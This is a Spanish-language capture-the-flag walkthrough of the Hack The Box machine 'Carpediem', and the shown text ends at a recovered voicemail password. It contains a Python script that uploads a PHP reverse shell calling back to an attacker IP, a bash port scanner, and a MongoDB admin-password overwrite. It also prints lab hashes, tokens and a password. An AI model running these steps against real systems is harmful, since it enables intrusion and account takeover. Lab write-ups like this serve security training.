---
title: Hackthebox Writeup Carpediem
date: 2022-09-05 15:13:12 pm
categories: [HTB, Writeups]
tags: [HTB, Linux, Hard, MongoDB, Pivoting, Python Scripting, Bash Scripting, Javascript Scripting, Capabilities, CVE-2021-45268, CVE-2022-0492, Information Leakage, VoIP System]

img_path: /assets/img/htb/writeups/carpediem
---

## Overview:

1. Evade login to website by **leaking SQL query**
2. **Remote code execution** by test function with full access (Container, python scripting)
3. **Network host scanning** (bash scripting)
4. Pivoting
5. Evade technical support web by **writing permissions to Mongodb database** (python and javascript scripting)
6. **Leak of SSH credentials** in helpdesk and VoIP system (Foothold)
7. Credential leak by **network traffic sniffing capabilities**
8. **Remote Code Execution** when uploading plugin to CMS Backdrop (Container, CVE-2021-45268, plugin creation)
9. Privilege escalation in container by **running a CMS backdrop script as root**
10. Escape a container as root by **exploiting the cgroup system** (CVE-2022-0492) (Privilege Escalation)

* * *

![Logo](logo.png){: .shadow}

|   OS  |      IP      | Release Date | Difficulty | Points |
|:-----:|:------------:|:------------:|:----------:|:------:|
| Linux | 10.10.11.167 |  25 Jun 2022 |    Hard    |   40   |

* * *

Antes de empezar verificamos que estamos conectado a la **VPN** de HTB y tenemos conexión con la máquina:

```shell
> ping -c1 10.10.11.167
PING 10.10.11.167 (10.10.11.167) 56(84) bytes of data.
64 bytes from 10.10.11.167: icmp_seq=1 ttl=63 time=105 ms
                                          \______________________ Linux Machine
--- 10.10.11.167 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
          \_________________\____________________________________ Successful connection
rtt min/avg/max/mdev = 105.308/105.308/105.308/0.000 ms
```
{: .nolineno}

> Explicación de parámetros:
>
> -c \<count\> : Número de paquetes ICMP que deseamos enviar a la máquina

## Enumeration

* * *

Con `nmap` realizamos un escaneo de tipo **TCP (Transfer Control Protocol)** para descubrir puertos abiertos:

```console
❯ nmap -p- -sS --min-rate 5000 -n -Pn 10.10.11.167
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-05 15:22 -05
Nmap scan report for 10.10.11.167
Host is up (0.11s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
                \_________________ Secure Shell Protocol
80/tcp  open  http
                \_________________ Hypertext Transfer Protocol
```

> Explicación de parámetros :
{: .prompt-info }

> -p- : Escanear todos los puertos, del 1 al 65,535
>
> -sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo
>
> \-\-min-rate \<number\> : Enviar una taza (\<number\>) de paquetes por segundo como mínimo 
>
> -n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)
>
> -Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneo

Continuamos con un escaneo a profundidad de los puertos **22(SSH) - 80(HTTP)**:

```console
❯ nmap -p22,80,443 -sCV 10.10.11.167 -oN tcp_openPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-05 15:24 -05
Nmap scan report for 10.10.11.167
Host is up (0.11s latency).

PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:21:76:f7:2d:c5:f0:4e:e0:a8:df:b4:d9:5e:45:26 (RSA)
|   256 b1:6d:e3:fa:da:10:b9:7b:9e:57:53:5c:5b:b7:60:06 (ECDSA)
|_  256 6a:16:96:d8:05:29:d5:90:bf:6b:2a:09:32:dc:36:4f (ED25519)
80/tcp  open   http    nginx 1.18.0 (Ubuntu)
|_http-title: Comming Soon
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp closed https
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> Explicación de parámetros :
{: .prompt-info}

> -p \<port\_1,port\_2,\.\.\.> : Indicamos que puertos queremos escanear 
>
> -sCV (Fusión de parámetros -sC -sV) 
>
> -sC : Ejecutar en los puertos scripts por defecto de nmap
> 
> -sV : Activar detección de versiones de los servicios que corren por los puertos
>
> -oN \<file\> : Guardar el output del escaneo en un archivo con formato Nmap

Empezamos buscando las tecnologías del sitio web **80(HTTP)**:

> Usando `whatweb`

```console
❯ whatweb 10.10.11.167
http://10.10.11.167 [200 OK] Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.167], Meta-Author[Pawel Zuchowski], Script[text/javascript], Title[Comming Soon], X-UA-Compatible[ie=edge], nginx[1.18.0]
```

![HTTPWeb](http_web.png){: .shadow}

Encontramos un nuevo nombre de dominio `carpediem.htb`, probablemente se esté aplicando **Virtual Hosting**, así que lo agregamos a nuestro archivo encargado de la resolución de direcciones IP y nombres de dominio _/etc/hosts_: `echo "10.10.11.167 carpediem.htb" >> /etc/hosts`

Lamentablemente no se aplica y nos encontramos en la misma página

Luego de enumerar directorios no encontramos nada interesante, así que intentamos enumerar subdominios:

```console
❯ gobuster vhost -t 100 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://carpediem.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://carpediem.htb
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/09/05 16:03:05 Starting gobuster in VHOST enumeration mode
===============================================================
Found: portal.carpediem.htb (Status: 200) [Size: 31090] <---------------- Subdomain!
```

Agregamos esté nuevo dominio a nuestro archivo _/etc/hosts_ y encontramos la siguiente interfaz:

![portalWeb](portal_http.png){: .shadow}

Podemos enumerar tecnologías con la extensión [Wappalyzer](https://www.wappalyzer.com/apps/) para saber que servidor web que corre por detrás, que lenguajes se aplican, etc.

Pero de primeras obervamos la opción **Login**, entonces nos creamos una cuenta y entramos:

![portalSession](portal_session.png){: .shadow}

Observamos en nuestra cuenta que tenemos un panel de reservas donde se almacenará el estado de nuestras reservas. Para comprobarlo intentamos hacer una reserva y nos muestra el siguiente mensaje:

![possibleCookieStealing](possible_cookieStealing.png){: .shadow}

Si es cierto lo que dice el mensaje, posiblemente podríamos aplicar un **Secuestro de sesión (Session hijacking)** para robar la cookie de los administradores de la web y tener mayores privilegios. Sin embargo, después de esperar varios minutos no se lográ alterar el estado de nuestra petición, descartando así esta posible brecha de ataque

## Foothold

* * *

Después de revisar la página y realizar una enumeración, encontramos la ruta _/admin_ pero nos muestra lo siguiente:

![adminWeb](portal_admin_denied.png){: .shadow}

Sin embargo, al no estar logeados si nos deja acceder a la ruta _/admin_ pero igualmente no podemos registrarnos. Es raro, así que para ver si existe una validación por detrás, usamos `burpsuite` para interceptar dicha petición:

![burpsuite](admin_burpsuite.png){: .shadow}

Observamos como respuesta la query de la consulta sobre la base de datos para validar el inicio de sessión, y vemos que pide que el campo `login_type = 1`. Probablemente no tengamos ese campo asignado. Para validar nuestros datos volvemos a nuestra sessión, y nos dirigimos al campo **Manage Account**:

![manageAccount](portal_manage_account.png){: .shadow}

Para ver que otros datos corren por detrás, nuevamente interceptamos la petición con `burpsuite` y bingo:

![updateAccount](update_account_burpsuite.png){: .shadow}

Observamos que tenemos el campo `login_type=2`, entonces lo cambiamos a **1** de manera exitosa, enviamos la petición, volvemos a la ruta _/admin/_ y tendremos acceso a la siguiente interfaz:

![storePortal](store_portal.png){: .shadow}

Volviendo a revisar la página, encontramos el usuario `Jeremy Hammond` en la sección Booking List. Además, en la sección **Quarterly Report Upload** encontramos el mensaje **"NOTE: Upload functions still in development!"**. Revisando en código fuente encontramos lo siguiente:

![uploadFun](upload_function.png){: .shadow}

Vemos la función **add_file**, que por el código intuimos que sirve para subir archivos por método **POST** a la dirección `\_base_url\_+"classes/Users.php?f=upload"` (base_url se declara al principio del código como _http://portal.carpediem.htb/_).

Entonces nos dirigimos a la ruta _http://portal.carpediem.htb/classes/Users.php?f=upload_:

![uploadFun](upload_function_page.png){: .shadow}

Nos aparece el mensaje **{"error":"multipart\/form-data missing"}** que sabemos que es parte de la cabezara **Content-Type**, la cuál es usada para indicar el tipo de recurso que se está pasando por la petición. 

> Recordemos que para pasar un archivo necesitamos seguir un patrón válido. Especialmente para el **Content-Type: multipart/form-data**, necesitamos usar el campo **boundary**, el cúal sirve como delimitador para la data que pasaremos (puede tomar cualquier valor)
{: .prompt-info}

Agregamos el **Content-Type**, el **boundary**, el nombre del archivo **(filename)**, y el nombre del campo **(name)** que especifíca el nombre asignado en la etiqueta _html_, el cuál logramos obtener su nombre al no ponerlo, ya que a principio no sabemos su nombre. Al final queda de esta manera:

![uploadBurp](upload_burpsuite.png){: .shadow}

Exitosamente subimos el archivo y logramos ver su contenido:

![phpInfo](php_info.png){: .shadow}

Ya que podemos subir archivos, entonces cargamos un archivo que ejecute una **shell inversa** a nuestra máquina. Como es costumbre, realizé un script en `python` paraautomatizar todo el proceso que vimos hasta el momento y conseguir la shell:

```python
import json
import random
import requests # pip install requests
import signal
import string
import sys
import threading

# variables
target_host = '10.10.11.167' 
target_url = 'http://portal.carpediem.htb' # configure DNS (/etc/hosts)

IP = sys.argv[1]
PORT = sys.argv[2]

# ctrl+C (exit the script) 
def ctrl_handler(signum, frame):
	print('\n[!] User Exit.'); sys.exit(1)

signal.signal(signal.SIGINT, ctrl_handler)

# get random string (to create account)
def get_randstr(length):
    return ''.join(random.choice(string.ascii_letters) for i in range(length))

# register user
def register(session):
	user = get_randstr(5)
	headers = {'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}
	post_data = '&'.join((
		'firstname={data}', 
		'lastname={data}', 
		'contact={data}', 
		'gender=Male', 
		'address=', 
		'username={data}', 
		'password={data}')).format(data=user)

	session.post(f'{target_url}/classes/Master.php?f=register', data=post_data, headers=headers)

	return user

# login user
def login(session, credentials):
	headers = {'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}
	post_data = '&'.join((
		'username={data}',
		'password={data}')).format(data=credentials)

	session.post(f'{target_url}/classes/Login.php?f=login_user', data=post_data, headers=headers)

# change privileges
def change_privileges(session, user, user_id):
	headers = {'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'}
	post_data = '&'.join((
		'id={id}',
		'login_type=1', # admin privileges (default=2)
		'firstname={data}',
		'lastname={data}',
		'contact={data}',
		'gender=Male',
		'address=',
		'username={data}',
		'password=')).format(data=user, id=user_id)
	
	r = session.post(f'{target_url}/classes/Master.php?f=update_account', data=post_data, headers=headers)
	
	if 'success' not in r.text:
		return False
	else:
		return True

# reverse shell
def reverse_shell(session):
	# listen to rev
	print('Open port {p} to receive the shell (g.e /usr/bin/nc -lvnp {p})'.format(p=PORT))
	input('Press any key to continue...')
	headers = {'Content-Type' : 'multipart/form-data; boundary=123456789'}
	post_data = """--123456789\r\nContent-Disposition: form-data; name="file_upload"; filename="rev_shell.php"\r\n\n<?php exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/{}/{} 0>&1'"); ?>\r\n--123456789""".format(IP, PORT)

	r = session.post(f'{target_url}/classes/Users.php?f=upload', data=post_data, headers=headers)
		
	file_name = str(json.loads(r.text)['success']).split()[0]

	session.get(f'{target_url}/{file_name}')

# make request
def request():
	try:
		# create session
		s = requests.Session()
		s.get(target_url)

		# register
		user = register(s)
		# login
		login(s, user)
		
		# change account_type value
		user_id = 0
		change_priv_thread = False
		while not change_priv_thread:
			change_priv_thread = threading.Thread(target=change_privileges, args=(s, user, user_id))
			change_priv_thread.start()
			user_id += 1

		# get reverse shell
		reverse_shell(s)

	except Exception as e:
		print('[x] %s' % e); sys.exit(1)


if __name__ == '__main__':
	request()
```

> Puedes encontrar el script en mi repositorio [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/Auto-tools_Carpediem/rev_www-data.6/www-data_6.py)
{: .prompt-info}

Aplicando los pasos anteriores nos logramos conectar como el usuario `www-data`:

```console
❯ python3 www-data_6.py 10.10.14.10 4444
Open port 4444 to receive the shell (g.e /usr/bin/nc -lvnp 4444)
Press any key to continue...

───────────────────────────────────────────────────────────────────────────────
❯ nc -lvnp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.167.
Ncat: Connection from 10.10.11.167:55140.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@3c371615b7aa:/var/www/html/portal/uploads$
```

Al realizar una enumeración básica encontramos que no estamos en la máquina objetivo y nos encontramos en otra red:

```console
www-data@3c371615b7aa:/var/www/html/portal$ hostname -I
172.17.0.6 
www-data@3c371615b7aa:/var/www/html/portal$ cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.3      mysql a5004fe641ca
172.17.0.6      3c371615b7aa
```

Además, podemos asegurar que nos encontramos dentro de un contenedor `Docker`:

```console
www-data@3c371615b7aa:/var/www/html/portal$ ls -la / | grep docker
-rwxr-xr-x   1 root root    0 Mar 24 15:34 .dockerenv     <------------ file created by Docker
www-data@3c371615b7aa:/var/www/html/portal$ cat /proc/1/cgroup  <------ List control groups (all come from Docker)
12:perf_event:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
11:cpuset:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
10:blkio:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
9:devices:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
8:rdma:/
7:net_cls,net_prio:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
6:memory:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
5:hugetlb:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
4:cpu,cpuacct:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
3:pids:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
2:freezer:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
1:name=systemd:/docker/3c371615b7aa586387d21357dc8f13708fba6726f918183ea08fe8b09976daaf
0::/system.slice/containerd.service
```

En los archivos de la web y en las variables de entorno (env) encontramos unas credenciales de **MySQL** del usuario `portaldb` y `root`, respectivamente. Nos nos serán de ayuda pero es bueno saberlo

Con mas enumeración encontramos un nuevo **subdominio** en el archivo _Trudesk.php_ (nombre que enteriormente vimos en la web "portal"). En resumen, `Trudek` es una solución de tickets de soporte técnico de código abierto. Agregamos la ruta nuestro archivo _/etc/hosts_ y vemos la siguiente interfaz:

![trudesk](trudesk_web.png){: .shadow}

Como solo tenemos un panel de login, y no poseemos credenciales válidas, dejaremos esto para después

Ya que estamos en otra red, podemos escanear que **hosts** están disponibles y que **puertos tienen abiertos**. Para ello, usamos un script clásico en `bash` para reconocimiento:

```bash
#!/bin/bash

# Host discovery
# --------------

# check if the host if live
is_alive()
{
  # send ICMP packets and wait for response
  ping -c 1 $1 > /dev/null
  # check status code successful (= 0)
  [ $? -eq 0 ] && echo Host $i: UP.
}

echo -e "\nHost discovery:\n"
for i in 172.17.0.{1..255} 
do
  # run function and pass it to the background
  is_alive $i & disown
done

# --------------


# Port discovery
# --------------
echo -e "\nPort discovery:\n"

declare -a hosts=(172.17.0.1 172.17.0.2 172.17.0.3 172.17.0.4 172.17.0.5 172.17.0.6)

for host in "${hosts[@]}"
do
  echo "Host $host:"
  for port in $(seq 1 36000)
  do
    timeout 1 bash -c "echo '' > /dev/tcp/$host/$port && echo -e '\tPort $port: OPEN'" 2>/dev/null &
  done
done; wait

# --------------
```

> Lo ejecutamos, probablemente tome su tiempo, pero vale la pena

```console
www-data@3c371615b7aa:/tmp$ ./portDiscovery.sh 

Host discovery:

Host 172.17.0.1: UP.
Host 172.17.0.4: UP.
Host 172.17.0.2: UP.
Host 172.17.0.6: UP.
Host 172.17.0.5: UP.
Host 172.17.0.3: UP.

Port discovery:

Host 172.17.0.1: <--- Host machine (10.10.11.167)
        Port 80: OPEN
        Port 22: OPEN
Host 172.17.0.2:
        Port 27017: OPEN <--- Mongodb
Host 172.17.0.3:
        Port 3306: OPEN <--- MySQL (classic protocol)
        Port 33060: OPEN <-- MySQL (X protocol)
Host 172.17.0.4:
        Port 21: OPEN <--- FTP
        Port 80: OPEN <--- Http
        Port 443: OPEN <-- Https
Host 172.17.0.5:
        Port 8118: OPEN <- Trudesk
Host 172.17.0.6: <--- Were are here
        Port 80: OPEN
```

> Puedes encontrar el script en mi repositorio [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/Auto-tools_Carpediem/reconnaissance/portDiscovery.sh)
{: .prompt-info}

Observamos varios puertos conocidos y los enlazamos con sus respectivos Servicios. Empezamos con el host `172.17.0.2` (**MongoDB**), el cuál es un sistema de base de datos noSQL

Ya que nos encontramos en un contenedor y nos tenemos muchas herramienta, lo que hacemos es simples palabras es **enviar el tráfico del puerto de nuestra máquina objetivo a un puerto de nuestra máquina local** (Remote port Forwarding). Para ello usamos la herramienta `chisel`:

```console
www-data@3c371615b7aa:/tmp$ ./chisel client 10.10.14.10:1234 R:27017:172.17.0.2:27017 
2022/09/06 03:16:42 client: Connecting to ws://10.10.14.10:1234
2022/09/06 03:16:43 client: Connected (Latency 107.222922ms)


──────────────────────────────────────────────────────────────────────────────────────────────
❯ ./chisel server -p 1234 --reverse
2022/09/05 22:15:59 server: Reverse tunnelling enabled
2022/09/05 22:15:59 server: Fingerprint nShNhlTjchKbgbrQZJUbJbiHDf9bMQpcNzs14TxFejY=
2022/09/05 22:15:59 server: Listening on http://0.0.0.0:1234
2022/09/05 22:16:39 server: session#1: tun: proxy#R:27017=>172.17.0.2:27017: Listening


───────────────────────────────────────────────────────────────────────────────────────────────
❯ netstat -tlnp | grep 27017
tcp6       0      0 :::27017                :::*                    LISTEN      10520/./chisel 
```

> Puedes encontrar la herramienta chisel en su repositorio [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
{: .prompt-info}

> Aquí tienes más información sobre la creación de túneles con chisel y más [https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
{: .prompt-tip}

Con el puerto en nuestra máquina local, ahora tenemos el servicio de **MongoDB** en nuestro puerto 27017 (puede ser cualquiera, pero por temas de orden y reconocimiento usamos el mismo). Para entrar a la base de datos usamos la herramienta **mongo** (shell interactiva en Javascript), y automáticamente de conectará como **localhost** al puerto **27017** (parámetros por defecto):

```console
❯ mongo
MongoDB shell version v5.3.1
connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("bb80bd61-3499-4d16-a3a4-39802bf17b68") }
MongoDB server version: 5.0.6
WARNING: shell and server versions do not match
================
Warning: the "mongo" shell has been superseded by "mongosh",
which delivers improved usability and compatibility.The "mongo" shell has been deprecated and will be removed in
an upcoming release.
For installation instructions, see
https://docs.mongodb.com/mongodb-shell/install/
================
---
The server generated these startup warnings when booting: <---------- Here!
        2022-09-05T17:34:57.402+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
        2022-09-05T17:35:05.174+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted
---
---
        Enable MongoDB's free cloud-based monitoring service, which will then receive and display
        metrics about your deployment (disk utilization, CPU, operation statistics, etc).

        The monitoring data will be available on a MongoDB website with a unique URL accessible to you
        and anyone you share the URL with. MongoDB may use this information to make product
        improvements and to suggest MongoDB products and deployment options to you.

        To enable free monitoring, run the following command: db.enableFreeMonitoring()
        To permanently disable this reminder, run the following command: db.disableFreeMonitoring()
---
```

> Debido a la adevertencia, notamos que está herramienta será dada de baja, así que recomiendo usar `mongosh` más adelante
{: .prompt-warning}

Ni bien iniciamos **mongo**, notamos el siguiente mensaje generado por el servido al iniciar: **"Access control is not enabled for the database. Read and write access to data and configuration is unrestricted"**. Entonces nos dice que podemos leer y escribir en la base de datos?, eso es muy interesante.

Primero enumeramos un poco:

```console
> show dbs                                                                                                                                                           [14/14]
admin    0.000GB 
config   0.000GB                                                                      
local    0.000GB
trudesk  0.001GB
> use admin                                                                           
switched to db admin                                                                  
> show collections                                                                    
system.users                                                                          
system.version                                                                        
> db.system.users.find()                                                              
{ "_id" : "trudesk.trudesk", "userId" : UUID("91edf315-70ed-424b-8af5-df2be2559a88"), "user" : "trudesk", "db" : "trudesk", "credentials" : { "SCRAM-SHA-1" : { "iterationCo
unt" : 10000, "salt" : "Ko2s2ZtnyVXoPkj8V9swbQ==", "storedKey" : "RMcvISwRJ/G3Phy536k7qXNxrwY=", "serverKey" : "DVRoL2j5ZNdejyf6TxM7XiD+vzw=" }, "SCRAM-SHA-256" : { "iterat
ionCount" : 15000, "salt" : "R8aRmvuyjDHYUIpv28g/p5k3KVexBC4URSbE/g==", "storedKey" : "II/yV9Z2qyjX7TDXYI+Zqh3903ZeTtmiT082SH7k0CY=", "serverKey" : "8J62Bb5ugt2OJalKj1NMq6F
FsyFLhRpxXMRSmR9EeDM=" } }, "roles" : [ { "role" : "userAdmin", "db" : "trudesk" } ] } 
```

> Por el output **0.00GB** puedes pensar que no hay nada, pero es falso, existe información como el usuario `trudesk` que es administrador
{: .prompt-tip}

Vemos que está la base de datos **Trudesk** y podemos enlazarlo con la página que encontramos antes. En otras palabras, tenemos en nuestras manos la base de datos de el sistema Trudesk (el login page que vimos anteriormente). Encontramos muchas tablas, y una importante, la de cuentas:

```console
> use trudesk
switched to db trudesk
> show collections
accounts
counters
departments
groups
messages
notifications
priorities
role_order
roles
sessions
settings
tags
teams
templates
tickets
tickettypes
> db.accounts.find()
{ "_id" : ObjectId("623c8b20855cc5001a8ba13c"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "admin", "password" : "$2b$10$imwoLPu0Au8LjNr08GXGy.xk/Exyr9PhKYk1lC/sKAfMFd5i3HrmS", "fullname" : "Robert Frost", "email" : "rfrost@carpediem.htb", "role" : ObjectId("623c8b20855cc5001a8ba138"), "title" : "Sr. Network Engineer", "accessToken" : "22e56ec0b94db029b07365d520213ef6f5d3d2d9", "__v" : 0, "lastOnline" : ISODate("2022-04-07T20:30:32.198Z") }
{ "_id" : ObjectId("6243c0be1e0d4d001b0740d4"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "jhammond", "email" : "jhammond@carpediem.htb", "password" : "$2b$10$n4yEOTLGA0SuQ.o0CbFbsex3pu2wYr924cKDaZgLKFH81Wbq7d9Pq", "fullname" : "Jeremy Hammond", "title" : "Sr. Systems Engineer", "role" : ObjectId("623c8b20855cc5001a8ba139"), "accessToken" : "a0833d9a06187dfd00d553bd235dfe83e957fd98", "__v" : 0, "lastOnline" : ISODate("2022-04-01T23:36:55.940Z") }
{ "_id" : ObjectId("6243c28f1e0d4d001b0740d6"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "jpardella", "email" : "jpardella@carpediem.htb", "password" : "$2b$10$nNoQGPes116eTUUl/3C8keEwZAeCfHCmX1t.yA1X3944WB2F.z2GK", "fullname" : "Joey Pardella", "title" : "Desktop Support", "role" : ObjectId("623c8b20855cc5001a8ba139"), "accessToken" : "7c0335559073138d82b64ed7b6c3efae427ece85", "__v" : 0, "lastOnline" : ISODate("2022-04-07T20:33:20.918Z") }
{ "_id" : ObjectId("6243c3471e0d4d001b0740d7"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "acooke", "email" : "acooke@carpediem.htb", "password" : "$2b$10$qZ64GjhVYetulM.dqt73zOV8IjlKYKtM/NjKPS1PB0rUcBMkKq0s.", "fullname" : "Adeanna Cooke", "title" : "Director - Human Resources", "role" : ObjectId("623c8b20855cc5001a8ba139"), "accessToken" : "9c7ace307a78322f1c09d62aae3815528c3b7547", "__v" : 0, "lastOnline" : ISODate("2022-03-30T14:21:15.212Z") }
{ "_id" : ObjectId("6243c69d1acd1559cdb4019b"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "svc-portal-tickets", "email" : "tickets@carpediem.htb", "password" : "$2b$10$CSRmXjH/psp9DdPmVjEYLOUEkgD7x8ax1S1yks4CTrbV6bfgBFXqW", "fullname" : "Portal Tickets", "title" : "", "role" : ObjectId("623c8b20855cc5001a8ba13a"), "accessToken" : "f8691bd2d8d613ec89337b5cd5a98554f8fffcc4", "__v" : 0, "lastOnline" : ISODate("2022-03-30T13:50:02.824Z") }
```

Como primer usuario vemos el nombre de `admin`, eso ya es sospechoso, así que intentamos actualizar su contraseña:

> Análisis de contraseña

![bcryptPass](bcrypt_hash.png){: shadow}

> Necesitamos generar una contraseña de formato `bcrypt`, para ello usamos `python`:

```python
import bcrypt

password = b'bestpassword123'

salt = bcrypt.gensalt()
password_hash = bcrypt.hashpw(password, salt)

print(password_hash.decode())

# Output
# $2b$12$J0bmFJhw6gJ3HmSfSLmnb.WbdIMkrhEPzMte.kY9f59GhreFX2vs.
```

> Volvemos a la base de datos y actualizamos la contraseña

```console
> db.accounts.update({"username":"admin"}, {$set: {"password" : "$2b$12$J0bmFJhw6gJ3HmSfSLmnb.WbdIMkrhEPzMte.kY9f59GhreFX2vs."}})
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
> db.accounts.find({"username":"admin"})
{ "_id" : ObjectId("623c8b20855cc5001a8ba13c"), "preferences" : { "tourCompleted" : false, "autoRefreshTicketGrid" : true, "openChatWindows" : [ ] }, "hasL2Auth" : false, "deleted" : false, "username" : "admin", "password" : "$2b$12$J0bmFJhw6gJ3HmSfSLmnb.WbdIMkrhEPzMte.kY9f59GhreFX2vs.", "fullname" : "Robert Frost", "email" : "rfrost@carpediem.htb", "role" : ObjectId("623c8b20855cc5001a8ba138"), "title" : "Sr. Network Engineer", "accessToken" : "22e56ec0b94db029b07365d520213ef6f5d3d2d9", "__v" : 0, "lastOnline" : ISODate("2022-04-07T20:30:32.198Z") }
```

Ahora volvemos a al subdominio de antes `trudesk.carpediem.htb`, nos logeamos como `admin` y la contraseña `bestpassword123` y logramos entrar

Para automatizar el proceso podemos crear un script en `javascript` que se encargue de actualizar la constraseña:

```javascript
// get database object
db = new Mongo().getDB('trudesk');

// to specify user
var username = "admin"
var new_password = "$2b$12$J0bmFJhw6gJ3HmSfSLmnb.WbdIMkrhEPzMte.kY9f59GhreFX2vs." // bestpassword123

// view administrator password
print("Old information :")
cursor = db.accounts.find({
  "username" : username
});
while (cursor.hasNext()) {
  printjson(cursor.next());
}
// update administrator password
print("[Password updated!]")
db.accounts.update({ "username" : username }, 
  { $set: {
      "password" : new_password
   }
});
// verify new password
print("New information :")
cursor = db.accounts.find({
  "username" : username
});
while (cursor.hasNext()) {
  printjson(cursor.next());
}
```

> Para ejecutarlo solo se lo pasamos como parámetro a `mongo` y se ejecutará automáticamente
{: .prompt-info}

> Este script y los anteriores los puedes encontrar en mi repositorio [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_Carpediem/change_adminpass)
{: .prompt-info}

> Aquí mas información sobre la actualización de datos en **mondodb** [https://www.mongodb.com/docs/manual/reference/operator/update/set/](https://www.mongodb.com/docs/manual/reference/operator/update/set/)
{: .prompt-info}

Una vez dentro nos encontramos con la siguiente interfaz:

![trudeskWeb](trudesk_admin_web.png){: .shadow}

Después de enumerar cada sección, nos encontramos una sobre los diferentes **tickets** del equipo. Aquí encontramos información enlazada a las vulnerabilidades que explotamos anteriormente

Hay un solo ticket que nos manda `Adeanna Cooke` sobre el ingreso de un nuevo Ingeniero de Redes, el cúal necesita que configuren sus credenciales y teléfono. Entonces nosotros como usuario `Robert Frost` nos comprometemos a hacer dicha tarea:

![trudeskTicket](trudesk_ticket.png){: .shadow}

Revisando la conversación se habla del sistema **VoIP**, acrónimo de Voz sobre Protocolo de Internet (Voice Over Internet Protocol). También menciona que le dejo por **mensaje de voz** la credenciales de este nuevo empleado. Además hablan sobre una aplicación `Zoiper`, el cuál es un software multiplataforma diseñado para trabajar con sus sistemas de comunicación IP basado en el protocolo SIP (lo que mencionamos anteriormente).

Como todo va tomando relación, buscando en internet sobre esta aplicación y logramos descargala con éxito:

![zoiperAPP](zoiper_app.png){: .shadow}

Observamos que necesitamos un usuario y contraseña. Esta parte es cuestión de relacionar la información y pensar un poco. Luego de ello y analizando bien la conversación podemos deducir las credenciales: `9650@carpediem.htb:2022` (hostname: carpediem.htb)

Una vez dentro marcamos en la interfaz `*62` para escuchar nuestra bandeja de mensajes de voz y con ello nuestra contraseña del servidor: `AuRj4pxq9qPk`

![zoiperVoicemail](zoiper_voicemail.png){: .shadow}

